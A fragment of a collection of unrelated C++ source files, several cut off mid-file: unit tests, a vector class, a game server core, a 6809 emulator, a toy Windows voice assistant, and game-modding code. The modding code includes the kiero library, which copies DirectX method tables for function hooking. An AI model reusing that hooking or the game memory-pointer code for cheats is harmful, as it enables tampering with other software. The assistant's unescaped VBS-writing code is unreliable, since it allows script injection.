&aAddress)\n\t\t{\n\t\t\tm_pInterval3Default = aAddress.RCast<decltype(m_pInterval3Default)>();\n\t\t});\n\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"&tick_interval3\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory &aAddress)\n\t\t{\n\t\t\tm_pInterval3 = aAddress.RCast<decltype(m_pInterval3)>();\n\t\t});\n\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"&ticks_per_second\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory &aAddress)\n\t\t{\n\t\t\tm_pPerSecond = aAddress.RCast<decltype(m_pPerSecond)>();\n\t\t});\n\n\t\tm_aGameConfig.GetAddresses().AddListener(&aCallbacks);\n\t}\n}\n\nbool Tickrate::Provider::GameDataStorage::CTick::Load(IGameData *pRoot, KeyValues3 *pGameConfig, GameData::CBufferStringVector &vecMessages)\n{\n\treturn m_aGameConfig.Load(pRoot, pGameConfig, vecMessages);\n}\n\nvoid Tickrate::Provider::GameDataStorage::CTick::Reset()\n{\n\tm_pInterval = nullptr;\n\tm_pInterval2 = nullptr;\n\tm_pInterval3Default = nullptr;\n\tm_pInterval3 = nullptr;\n\tm_pPerSecond = nullptr;\n}\n\nfloat *Tickrate::Provider::GameDataStorage::CTick::GetIntervalPointer() const\n{\n\treturn m_pInterval;\n}\n\ndouble *Tickrate::Provider::GameDataStorage::CTick::GetInterval2Pointer() const\n{\n\treturn m_pInterval2;\n}\n\nfloat *Tickrate::Provider::GameDataStorage::CTick::GetInterval3DefaultPointer() const\n{\n\treturn m_pInterval3Default;\n}\n\nfloat *Tickrate::Provider::GameDataStorage::CTick::GetInterval3Pointer() const\n{\n\treturn m_pInterval3;\n}\n\nfloat *Tickrate::Provider::GameDataStorage::CTick::GetPerSecond() const\n{\n\treturn m_pPerSecond;\n}\n",
    "\ufeff#include \"pch.h\"\n#include \"CppUnitTest.h\"\n#include <bitset>\n#include \"../LABA_2/LABA_2.cpp\" \n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace UnitTest1\n{\n    TEST_CLASS(UnitTest1)\n    {\n    public:\n\n        TEST_METHOD(TestLogicalOperations)\n        {\n            bool p, q;\n\n            \n            p = true;\n            q = false;\n\n            \n            bool expectedAnd = p && q; \n            bool expectedOr = p || q;  \n            bool expectedXor = p ^ q;  \n            bool expectedImplication = !p || q; \n            bool expectedEquivalence = (p && q) || (!p && !q); \n\n            \n            Assert::AreEqual(expectedAnd, false);\n            Assert::AreEqual(expectedOr, true);\n            Assert::AreEqual(expectedXor, true);\n            Assert::AreEqual(expectedImplication, false);\n            Assert::AreEqual(expectedEquivalence, false); \n        }\n\n        TEST_METHOD(TestBitwiseOperations)\n        {\n            std::bitset<8> b1(\"11111000\");\n            std::bitset<8> b2(\"10100110\");\n\n            \n            std::bitset<8> expectedOr = b1 | b2; \n            std::bitset<8> expectedAnd = b1 & b2; \n            std::bitset<8> expectedXor = b1 ^ b2; \n\n            Assert::AreEqual(expectedOr.to_ulong(), std::bitset<8>(\"11111110\").to_ulong());\n            Assert::AreEqual(expectedAnd.to_ulong(), std::bitset<8>(\"10100000\").to_ulong());\n            Assert::AreEqual(expectedXor.to_ulong(), std::bitset<8>(\"01011110\").to_ulong());\n        }\n    };\n}\n",
    "#include \"Vector.h\"\n\n\nVector::Vector() : x(0), y(0), z(0) {}\nVector::Vector(double x, double y, double z) : x(x), y(y), z(z) {}\n\n\ndouble Vector::getX() const { return x; }\ndouble Vector::getY() const { return y; }\ndouble Vector::getZ() const { return z; }\n\nvoid Vector::setX(double x) { this->x = x; }\nvoid Vector::setY(double y) { this->y = y; }\nvoid Vector::setZ(double z) { this->z = z; }\n\n\nvoid Vector::Init(double x, double y, double z) {\n    this->x = x;\n    this->y = y;\n    this->z = z;\n}\n\n\nvoid Vector::Read() {\n    std::cout << \"\u0412\u0432\u0435\u0434\u0456\u0442\u044c x: \"; std::cin >> x;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0456\u0442\u044c y: \"; std::cin >> y;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0456\u0442\u044c z: \"; std::cin >> z;\n}\n\n\nvoid Vector::Display() const {\n    std::cout << \"\u0412\u0435\u043a\u0442\u043e\u0440: (\" << x << \", \" << y << \", \" << z << \")\" << std::endl;\n}\n\n\nstd::string Vector::toString() const {\n    return \"Vector(\" + std::to_string(x) + \", \" + std::to_string(y) + \", \" + std::to_string(z) + \")\";\n}\n\n\nVector Vector::add(const Vector& v) const {\n    return Vector(x + v.x, y + v.y, z + v.z);\n}\n\n\ndouble Vector::dotProduct(const Vector& v) const {\n    return x * v.x + y * v.y + z * v.z;\n}\n\n\ndouble Vector::length() const {\n    return std::sqrt(x * x + y * y + z * z);\n}\n",
    "#include \"kiero.h\"\n#include <Windows.h>\n#include <assert.h>\n\n#if KIERO_INCLUDE_D3D9\n# include <d3d9.h>\n#endif\n\n#if KIERO_INCLUDE_D3D10\n# include <dxgi.h>\n# include <d3d10_1.h>\n# include <d3d10.h>\n#endif\n\n#if KIERO_INCLUDE_D3D11\n# include <dxgi.h>\n# include <d3d11.h>\n#endif\n\n#if KIERO_INCLUDE_D3D12\n# include <dxgi.h>\n# include <d3d12.h>\n#endif\n\n#if KIERO_INCLUDE_OPENGL\n# include <gl/GL.h>\n#endif\n\n#if KIERO_INCLUDE_VULKAN\n# include <vulkan/vulkan.h>\n#endif\n\n#if KIERO_USE_MINHOOK\n#include \"../minhook/Minhook.h\"\n#endif\n\n#ifdef _UNICODE\n# define KIERO_TEXT(text) L##text\n#else\n# define KIERO_TEXT(text) text\n#endif\n\n#define KIERO_ARRAY_SIZE(arr) ((size_t)(sizeof(arr)/sizeof(arr[0])))\n\nstatic kiero::RenderType::Enum g_renderType = kiero::RenderType::None;\nstatic uint150_t* g_methodsTable = NULL;\n\nkiero::Status::Enum kiero::init(RenderType::Enum _renderType)\n{\n\tif (g_renderType != RenderType::None)\n\t{\n\t\treturn Status::AlreadyInitializedError;\n\t}\n\n\tif (_renderType != RenderType::None)\n\t{\n\t\tif (_renderType >= RenderType::D3D9 && _renderType <= RenderType::D3D12)\n\t\t{\n\t\t\tWNDCLASSEX windowClass;\n\t\t\twindowClass.cbSize = sizeof(WNDCLASSEX);\n\t\t\twindowClass.style = CS_HREDRAW | CS_VREDRAW;\n\t\t\twindowClass.lpfnWndProc = DefWindowProc;\n\t\t\twindowClass.cbClsExtra = 0;\n\t\t\twindowClass.cbWndExtra = 0;\n\t\t\twindowClass.hInstance = GetModuleHandle(NULL);\n\t\t\twindowClass.hIcon = NULL;\n\t\t\twindowClass.hCursor = NULL;\n\t\t\twindowClass.hbrBackground = NULL;\n\t\t\twindowClass.lpszMenuName = NULL;\n\t\t\twindowClass.lpszClassName = KIERO_TEXT(\"Kiero\");\n\t\t\twindowClass.hIconSm = NULL;\n\n\t\t\t::RegisterClassEx(&windowClass);\n\n\t\t\tHWND window = ::CreateWindow(windowClass.lpszClassName, KIERO_TEXT(\"Kiero DirectX Window\"), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, windowClass.hInstance, NULL);\n\n\t\t\tif (_renderType == RenderType::D3D9)\n\t\t\t{\n#if KIERO_INCLUDE_D3D9\n\t\t\t\tHMODULE libD3D9;\n\t\t\t\tif ((libD3D9 = ::GetModuleHandle(KIERO_TEXT(\"d3d9.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* Direct3DCreate9;\n\t\t\t\tif ((Direct3DCreate9 = ::GetProcAddress(libD3D9, \"Direct3DCreate9\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tLPDIRECT3D9 direct3D9;\n\t\t\t\tif ((direct3D9 = ((LPDIRECT3D9(__stdcall*)(uint32_t))(Direct3DCreate9))(D3D_SDK_VERSION)) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DPRESENT_PARAMETERS params;\n\t\t\t\tparams.BackBufferWidth = 0;\n\t\t\t\tparams.BackBufferHeight = 0;\n\t\t\t\tparams.BackBufferFormat = D3DFMT_UNKNOWN;\n\t\t\t\tparams.BackBufferCount = 0;\n\t\t\t\tparams.MultiSampleType = D3DMULTISAMPLE_NONE;\n\t\t\t\tparams.MultiSampleQuality = NULL;\n\t\t\t\tparams.SwapEffect = D3DSWAPEFFECT_DISCARD;\n\t\t\t\tparams.hDeviceWindow = window;\n\t\t\t\tparams.Windowed = 1;\n\t\t\t\tparams.EnableAutoDepthStencil = 0;\n\t\t\t\tparams.AutoDepthStencilFormat = D3DFMT_UNKNOWN;\n\t\t\t\tparams.Flags = NULL;\n\t\t\t\tparams.FullScreen_RefreshRateInHz = 0;\n\t\t\t\tparams.PresentationInterval = 0;\n\n\t\t\t\tLPDIRECT3DDEVICE9 device;\n\t\t\t\tif (direct3D9->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_NULLREF, window, D3DCREATE_SOFTWARE_VERTEXPROCESSING | D3DCREATE_DISABLE_DRIVER_MANAGEMENT, &params, &device) < 0)\n\t\t\t\t{\n\t\t\t\t\tdirect3D9->Release();\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tg_methodsTable = (uint150_t*)::calloc(119, sizeof(uint150_t));\n\t\t\t\t::memcpy(g_methodsTable, *(uint150_t**)device, 119 * sizeof(uint150_t));\n\n#if KIERO_USE_MINHOOK\n\t\t\t\tMH_Initialize();\n#endif\n\n\t\t\t\tdevice->Release();\n\t\t\t\tdevice = NULL;\n\n\t\t\t\tdirect3D9->Release();\n\t\t\t\tdirect3D9 = NULL;\n\n\t\t\t\tg_renderType = RenderType::D3D9;\n\n\t\t\t\t::DestroyWindow(window);\n\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\n\t\t\t\treturn Status::Success;\n#endif\n\t\t\t}\n\t\t\telse if (_renderType == RenderType::D3D10)\n\t\t\t{\n#if KIERO_INCLUDE_D3D10\n\t\t\t\tHMODULE libDXGI;\n\t\t\t\tHMODULE libD3D10;\n\t\t\t\tif ((libDXGI = ::GetModuleHandle(KIERO_TEXT(\"dxgi.dll\"))) == NULL || (libD3D10 = ::GetModuleHandle(KIERO_TEXT(\"d3d10.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* CreateDXGIFactory;\n\t\t\t\tif ((CreateDXGIFactory = ::GetProcAddress(libDXGI, \"CreateDXGIFactory\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tIDXGIFactory* factory;\n\t\t\t\tif (((long(__stdcall*)(const IID&, void**))(CreateDXGIFactory))(__uuidof(IDXGIFactory), (void**)&factory) < 0)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\tretu",
    "/*\n----------------------------------------------------------------------------\n               Project title   : Andy(virtual assistant)\n               Made By         : Siddhi Singh\n               Written in      : C++\n               Started project : 27 July , 2024\n               Platform        : Windows\n               IDE used        : Codeblocks\n               Last Modified   : 20 August , 2024\n               Total Code      : 700+ Lines\n ----------------------------------------------------------------------------\n*/\n\n\n//---------------assistant.c++-----------------\n\n#include \"assistant.h\"\n\n\n\nstring greet;\n//--------------constructor---------------\nassistant::assistant()\n{\n\n  system(\"md data\");\n  system(\"attrib +s +h data\");\n  system(\"cls\");\n  system(\"title   Andy\");\n\n}\n\n//----------greeting function--------------\nvoid assistant::greeting()\n{\n  system(\"color a\");\n  cout << \"\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\\t\\t\\t\";\n  cout << \"Welcome to Andy \";\n  Sleep(300);\n  speak(greet);\n  system(\"color 0c\");\n  Sleep(400);\n}\n\n//--------------speak function--------------\nvoid assistant::speak(string s)\n{\n  ofstream file;\n  file.open(\"data//speak.vbs\", ios::out);\n  file << \"dim s\";\n  file << \"\\nset s = createObject(\\\"sapi.spvoice\\\")\";\n  file << \"\\ns.speak \\\"\" << s << \"\\\"\";\n  file.close();\n  system(\"start data//speak.vbs\");\n  Sleep(300);\n}\n\n//---------------typing function--------------\nvoid assistant::typing(string t)\n{\n  speak(t);   //----------for speaking the text\n  for (int i = 0; t[i] != '\\0'; i++)\n  {\n    cout << t[i];\n    Sleep(65);\n  }\n\n}\n\n//-------------------clock function--------------\nvoid assistant::clock()\n{\n  string DAYS[] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\n  string numDesc[] = {\"th\", \"st\", \"nd\", \"rd\", \"th\", \"th\", \"th\", \"th\", \"th\", \"th\"};\n  string monthDesc[] = {\"January\", \"February\", \"March\", \"April\", \"May\", \"June\", \"July\", \"August\", \"September\", \"October\", \"November\", \"December\"};\n\n  cout << std::boolalpha;\n  time_t now = time(0);\n  tm*ltm = localtime(&now);\n  if (ltm->tm_hour < 12)\n    greet = \"Good morning\";\n  else if (ltm->tm_hour >= 12)\n    if (ltm->tm_hour > 16)\n      greet = \"Good evening\";\n    else\n      greet = \"Good Afternoon\";\n\n  cout << \"   \" << monthDesc[ltm->tm_mon];\n  cout << \" \" << ltm->tm_mday << numDesc[ltm->tm_mday % 10];\n  cout << \" \" << ltm->tm_year + 1900 ;\n  if (DAYS[ltm->tm_wday] == \"Monday\")\n    cout << \" (Sunday)\";\n  else\n    cout << \" (\" << DAYS[ltm->tm_wday - 1] << \")\";\n  greet += \" Siddhi\";\n  cout << \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\";\n  cout << greet;\n  cout << \"\\n   Time:-\" << ( ltm->tm_hour <= 12 ? ltm->tm_hour : ltm->tm_hour - 12);\n  cout << \":\" << ltm->tm_min << (ltm->tm_hour < 12 ? \"am\" : \"pm\");\n\n}\n\n\n\n\nassistant::~assistant()\n{\n  system(\"attrib +s +h data\");\n}\r\n",
    "#include <Utils/System/Misc.h>\n#include <Utils/Data/String.h>\n\n#include <windows.h>\n\n\nstd::string Misc::GetRoamingPath()\n{\n    char* path = nullptr;\n    size_t length;\n\n    _dupenv_s(&path, &length, \"appdata\");\n\n    if (path == nullptr)\n        return \"\";\n\n    return std::string(path) + \"\\\\..\\\\Local\\\\Packages\\\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\\\RoamingState\";\n};\n\nuint64_t Misc::GetCurrentMs() {\n\treturn std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n}\n\nstd::string Misc::GetModuleOfAddress(uintptr_t address) {\n    MEMORY_BASIC_INFORMATION mbi;\n    if (VirtualQuery((void*)address, &mbi, sizeof(mbi))) {\n        char moduleName[MAX_PATH];\n        if (GetModuleFileNameA((HMODULE)mbi.AllocationBase, moduleName, sizeof(moduleName))) {\n            uintptr_t moduleBase = (uintptr_t)mbi.AllocationBase;\n\n            std::string modName = moduleName;\n            std::string result = modName + \"+\" + String::ToHex((address - moduleBase));\n\n            return result.substr(result.find_last_of(\"\\\\\") + 1);\n        }\n    }\n    return std::string(String::ToHex(address));\n}\n\nstd::string Misc::RandString(const int len) {\n    static const char alphanum[] =\n        \"0123456789\"\n        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n        \"abcdefghijklmnopqrstuvwxyz\";\n    std::string tmp_s;\n    tmp_s.reserve(len);\n\n    for (int i = 0; i < len; ++i) {\n        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];\n    }\n\n    return tmp_s;\n}",
    "#include <algorithm>\n#include \"gtest/gtest.h\"\n#include \"gmock/gmock.h\"\n\n#include <string>\n#include <vector>\n#include \"unique_ptr.h\"\n#include \"shared_ptr.h\"\n\n\nTEST(HW4Test, TEST1) {\n    UniquePtr<int> ptr1{new int{10}};\n    EXPECT_EQ(*ptr1.get(), 10);\n\n    UniquePtr<std::string> ptr2{new std::string{\"hello world!\"}};\n    EXPECT_EQ(*ptr2.get(), \"hello world!\");\n}\n\nTEST(HW4Test, TEST2) {\n    UniquePtr<int> ptr1{make_unique<int>(10)};\n    EXPECT_EQ(*ptr1.get(), 10);\n\n    UniquePtr<std::string> ptr2{make_unique<std::string>(\"hello world!\")};\n    EXPECT_EQ(*ptr2.get(), \"hello world!\");\n}\n\nTEST(HW4Test, TEST3) {\n    UniquePtr<int> ptr1;\n    EXPECT_EQ(ptr1.get(), nullptr);\n\n    UniquePtr<std::string> ptr2{};\n    EXPECT_EQ(ptr2.get(), nullptr);\n}\n\nTEST(HW4Test, TEST4) {\n    UniquePtr<int> ptr1{new int{10}};\n    EXPECT_EQ(*ptr1, 10);\n\n    UniquePtr<std::string> ptr2{new std::string{\"hello world!\"}};\n    EXPECT_EQ(*ptr2, \"hello world!\");\n\n    UniquePtr<std::vector<int>> ptr3{new std::vector<int>{1, 2, 3, 4, 5}};\n    EXPECT_EQ((*ptr3)[1], 2);\n}\n\nTEST(HW4Test, TEST5) {\n    UniquePtr<std::string> ptr1{new std::string{\"hello world!\"}};\n    EXPECT_EQ(ptr1->length(), 12);\n\n    UniquePtr<std::vector<int>> ptr3{new std::vector<int>{1, 2, 3, 4, 5}};\n    EXPECT_FALSE(ptr3->empty());\n}\n\nTEST(HW4Test, TEST6) {\n    UniquePtr<std::string> ptr{new std::string{\"hello world!\"}};\n    EXPECT_EQ(ptr->length(), 12);\n    ptr.reset();\n    EXPECT_EQ(ptr.get(), nullptr);\n}\n\nTEST(HW4Test, TEST7) {\n    UniquePtr<std::string> ptr{new std::string{\"hello world!\"}};\n    EXPECT_EQ(ptr->length(), 12);\n    ptr.reset(new std::string{\"nice job!\"});\n    EXPECT_EQ(*ptr, \"nice job!\");\n}\n\nTEST(HW4Test, TEST8) {\n    UniquePtr<double> ptr{new double{1.567}};\n    EXPECT_DOUBLE_EQ(*ptr, 1.567);\n    if(ptr)\n        ptr.reset();\n    EXPECT_FALSE(ptr);\n}\n\nTEST(HW4Test, TEST9) {\n    UniquePtr<double> ptr{new double{1.567}};\n    EXPECT_DOUBLE_EQ(*ptr, 1.567);\n    double *tmp;\n    if(ptr)\n        tmp = ptr.release();\n    EXPECT_DOUBLE_EQ(*tmp, 1.567);\n    EXPECT_FALSE(ptr);\n    delete tmp;\n}\n\nTEST(HW4Test, TEST10) {\n    SharedPtr<int> ptr1{new int{10}};\n    EXPECT_EQ(*ptr1.get(), 10);\n\n    SharedPtr<std::string> ptr2{new std::string{\"hello world!\"}};\n    EXPECT_EQ(*ptr2.get(), \"hello world!\");\n}\n\nTEST(HW4Test, TEST11) {\n    SharedPtr<int> ptr1{make_shared<int>(10)};\n    EXPECT_EQ(*ptr1.get(), 10);\n\n    SharedPtr<std::string> ptr2{make_shared<std::string>(\"hello world!\")};\n    EXPECT_EQ(*ptr2.get(), \"hello world!\");\n}\n\nTEST(HW4Test, TEST12) {\n    SharedPtr<int> ptr1;\n    EXPECT_EQ(ptr1.get(), nullptr);\n\n    SharedPtr<std::string> ptr2{};\n    EXPECT_EQ(ptr2.get(), nullptr);\n}\n\nTEST(HW4Test, TEST13) {\n    SharedPtr<int> ptr1{make_shared<int>(10)};\n    SharedPtr<int> ptr2{ptr1};\n    EXPECT_EQ(*ptr1, 10);\n    EXPECT_EQ(*ptr2, 10);\n    EXPECT_EQ(ptr1.get(), ptr2.get());\n    EXPECT_EQ(ptr1.use_count(), 2);\n    EXPECT_EQ(ptr2.use_count(), 2);    \n}\n\nTEST(HW4Test, TEST14) {\n    SharedPtr<std::string> ptr1{make_shared<std::string>(\"hello world!\")};\n    SharedPtr<std::string> ptr2{ptr1};\n    SharedPtr<std::string> ptr3{ptr1};\n    EXPECT_EQ(*ptr1, \"hello world!\");\n    EXPECT_EQ(*ptr1, \"hello world!\");\n    EXPECT_EQ(*ptr2, \"hello world!\");\n    EXPECT_EQ(ptr1.get(), ptr2.get());\n    EXPECT_EQ(ptr2.get(), ptr3.get());\n    EXPECT_EQ(ptr1.use_count(), 3);\n    EXPECT_EQ(ptr2.use_count(), 3);    \n    EXPECT_EQ(ptr3.use_count(), 3);    \n}\n\nTEST(HW4Test, TEST15) {\n    SharedPtr<std::string> ptr1{make_shared<std::string>(\"hello world!\")};\n    {\n        {\n            SharedPtr<std::string> ptr2{ptr1};\n            EXPECT_EQ(ptr1.use_count(), 2);\n            EXPECT_EQ(ptr2.use_count(), 2);    \n        }\n        EXPECT_EQ(ptr1.use_count(), 1);\n        SharedPtr<std::string> ptr3{ptr1};\n        EXPECT_EQ(ptr1.use_count(), 2);\n        EXPECT_EQ(ptr3.use_count(), 2);\n    }\n    EXPECT_EQ(ptr1.use_count(), 1);\n    ptr1.~SharedPtr();\n    EXPECT_EQ(ptr1.use_count(), 0);\n    EXPECT_EQ(ptr1.get(), nullptr);\n}\n\nTEST(HW4Test, TEST16) {\n    SharedPtr<int> ptr1{new int{10}};\n    EXPECT_EQ(*ptr1, 10);\n\n    SharedPtr<std::string> ptr2{new std::string{\"hello world!\"}};\n    EXPECT_EQ(*ptr2, \"hello world!\");\n\n    SharedPtr<std::vector<int>> ptr3{new std::vector<int>{1, 2, 3, 4, 5}};\n    EXPECT_EQ((*ptr3)[1], 2);\n}\n\nTEST(HW4Test, TEST17) {\n    SharedPtr<std::string> ptr1{new std::string{\"hello world!\"}};\n    EXPECT_EQ(ptr1->length(), 12);\n\n    SharedPtr<std::vector<int>> ptr3{new std::vector<int>{1, 2, 3, 4, 5}};\n    EXPECT_FALSE(ptr3->empty());\n}\n\nTEST(HW4Test, TEST18) {\n    SharedPtr<std::string> ptr{new std::string{\"hello world!\"}};\n    EXPECT_EQ(ptr->length(), 12);\n    ptr.reset();\n    EXPECT_EQ(ptr.get(), nullptr);\n    EXPECT_EQ(ptr.use_count(), 0);\n}\n\nTEST(HW4Test, TEST19) {\n    SharedPtr<std::string> ptr{new std::string{\"hello world!\"}};\n    EXPECT_EQ(ptr->length(), 12);\n    ptr.reset(new std::string{\"nice job!\"});\n    EXPECT_EQ(*ptr, \"nice job!\");\n    EXPECT_EQ(ptr.use_count(), 1);\n}\n\nTEST(HW4Test, TEST",
    "#include \"Core.hpp\"\n#include \"QueryHandler.hpp\"\n#include \"socket/Server.hpp\"\n#include \"Config.hpp\"\n#include \"Logger.hpp\"\n#include \"Registry.hpp\"\n#include \"TextureLoader.hpp\"\n#include <boost/algorithm/string/split.hpp>\n#include <cstdlib>\n#include <iostream>\n\nvoid Core::_initTextures() {\n    TextureLoader::getInstance().loadFile(\"assets/textures_config.cfg\");\n    TextureLoader::getInstance().loadTextures(\"backgrounds\", TextureLoader::Type::BACKGROUND);\n    TextureLoader::getInstance().loadTextures(\"bullets\", TextureLoader::Type::BULLET);\n    TextureLoader::getInstance().loadTextures(\"enemies\", TextureLoader::Type::ENEMY);\n    TextureLoader::getInstance().loadTextures(\"ships\", TextureLoader::Type::SHIP);\n    Logger::log(LogLevel::INFO, std::format(\"{0} textures have been loaded\", TextureLoader::getInstance().getNoTexture()));\n}\n\nvoid Core::_stop() {\n    this->_isRunning = false;\n}\n\nvoid Core::_waitTPS() {\n    double elapsed = this->_tpsClock.get();\n    if (elapsed < this->_tickTime) {\n        int time = static_cast<int>((this->_tickTime - elapsed) * 1000);\n        std::this_thread::sleep_for(std::chrono::microseconds(time));\n    }\n    this->_tpsClock.reset();\n}\n\nvoid Core::_readStdin() {\n    while (this->_isRunning) {\n        std::string line;\n        std::getline(std::cin, line);\n        line = line.substr(0, line.find('\\n'));\n        for (auto command: _stdinMap) {\n            if (command.first == line) {\n                (*this.*command.second)();\n            }\n        }\n    }\n}\n\nvoid Core::_loop(network::socket::udp::Server& server) {\n    if (server.availableRequest()) {\n        auto query = server.recv<Query>();\n        network::Client client = query.first;\n        network::QueryHandler::getInstance().addQuery(query);\n    }\n    network::QueryHandler::getInstance().executeQueries();\n    network::QueryHandler::getInstance().checkWorkers();\n}\n\nCore::Core() :\n    _tps(20),\n    _tickTime(1000 / _tps),\n    _isRunning(true),\n    _port(8080) {}\n\nvoid Core::init(const std::span<char *>& args [[maybe_unused]]) {\n    Config& config = Config::getInstance(\"server/config.json\");\n\n    this->_tps = std::atoi(config.get(\"tps\").value_or(\"20\").c_str());\n    _tickTime = 1000 / _tps;\n    this->_port = std::atoi(config.get(\"port\").value_or(\"8080\").c_str());\n    this->_hitboxes_config_file = config.get(\"hitboxes_config_file\").value_or(\"\");\n    Logger::log(LogLevel::INFO, std::format(\"Server running on port {0}\", this->_port));\n    this->_initTextures();\n}\n\nint Core::run() {\n    network::QueryHandler& handler = network::QueryHandler::getInstance();\n    network::socket::udp::Server server(_port);\n    std::thread stdinThread(&Core::_readStdin, this);\n\n    while (this->_isRunning) {\n        this->_loop(server);\n        this->_waitTPS();\n    }\n    stdinThread.join();\n    return 0;\n}\n",
    "#include \"GimeBus.h\"\r\n#include \"CPU6809.h\"\r\n\r\n// cpu6809 Constructor\r\nCpu6809::Cpu6809()\r\n{\r\n\twaitingForNextOp = false;\r\n\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\tcpuHardwareHalt = false;\r\n\tcpuHaltAsserted = false;\r\n\tnextOpWaitCounter = 0;\r\n\tcpuCyclesTotal = 0;\r\n\tcurOpCode = 0;\r\n\r\n\tcpuReg.CC.E = true;\r\n\r\n\t//fopen_s(&traceListFile, \"D:\\\\Temp\\\\coco3emu_trace.lst\", \"wb\");\r\n}\r\n\r\nuint8_t Cpu6809::readByteAtCurPC()\r\n{\r\n\t// Automatically increments the PC register\r\n\tuint8_t readByte = gimeBus->readMemoryByte(cpuReg.PC);\r\n\tcpuReg.PC++;\r\n\treturn readByte;\r\n}\r\n\r\nuint16_t Cpu6809::readWordAtCurPC()\r\n{\r\n\t// Automatically advances the PC register by 2 bytes\r\n\tuint16_t readWord = gimeBus->readMemoryWord(cpuReg.PC);\r\n\tcpuReg.PC += 2;\r\n\treturn readWord;\r\n}\r\n\r\nvoid Cpu6809::cpuClockTick()\r\n{\r\n\t#define DEBUGGER_ENABLED 1\r\n\r\n\tif (nextOpWaitCounter != 0)\r\n\t\tnextOpWaitCounter--;\r\n\telse\r\n\t{\r\n\t\tif (cpuHardwareHalt)\r\n\t\t\treturn;\r\n\t\telse if (cpuHaltAsserted)\r\n\t\t{\r\n\t\t\tcpuHardwareHalt = true;\r\n\t\t\tcpuHaltAsserted = false;\r\n\t\t}\r\n\r\n\t\t// Check for asserted interrupt signals\r\n\t\tif (assertedInterrupts[INT_NMI])\r\n\t\t{\r\n\t\t\tif (cpuSoftHalt != CPU_SOFTWARE_HALT_CWAI)\r\n\t\t\t{\r\n\t\t\t\tcpuReg.CC.E = true;\r\n\t\t\t\toperandByte = 0xFF;\t\t\t// 0xFF = every bit set such that all registers are pushed to hardware stack\r\n\t\t\t\tpushToStack(&cpuReg.S);\r\n\t\t\t\tcpuReg.CC.F = true;\r\n\t\t\t\tcpuReg.CC.I = true;\r\n\t\t\t}\r\n\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\t\t\tcpuReg.PC = gimeBus->readMemoryWord(VECTOR_NMI);\r\n\t\t\t// Since NMI interrupts are edge triggered, the Disk Controller (presumably) only sends a brief pulse to trigger the interrupt, and then it immediately returns to normal\r\n\t\t\tassertedInterrupts[INT_NMI] &= ~INT_ASSERT_MASK_NMI;\r\n\t\t}\r\n\t\telse if (assertedInterrupts[INT_FIRQ])\r\n\t\t{\r\n\t\t\tif (!cpuReg.CC.F)\r\n\t\t\t{\r\n\t\t\t\tif (cpuSoftHalt != CPU_SOFTWARE_HALT_CWAI)\r\n\t\t\t\t{\r\n\t\t\t\t\tcpuReg.CC.E = false;\r\n\t\t\t\t\toperandByte = MASK_PC | MASK_CC;\r\n\t\t\t\t\tpushToStack(&cpuReg.S);\r\n\t\t\t\t\tcpuReg.CC.F = true;\r\n\t\t\t\t\tcpuReg.CC.I = true;\r\n\t\t\t\t}\r\n\t\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\t\t\t\tcpuReg.PC = gimeBus->readMemoryWord(VECTOR_FIRQ);\r\n\t\t\t}\r\n\t\t\telse if (cpuSoftHalt == CPU_SOFTWARE_HALT_SYNC)\r\n\t\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\t\t}\r\n\t\telse if (assertedInterrupts[INT_IRQ])\r\n\t\t{\r\n\t\t\tif (!cpuReg.CC.I)\r\n\t\t\t{\r\n\t\t\t\tif (cpuSoftHalt != CPU_SOFTWARE_HALT_CWAI)\r\n\t\t\t\t{\r\n\t\t\t\t\tcpuReg.CC.E = true;\r\n\t\t\t\t\toperandByte = 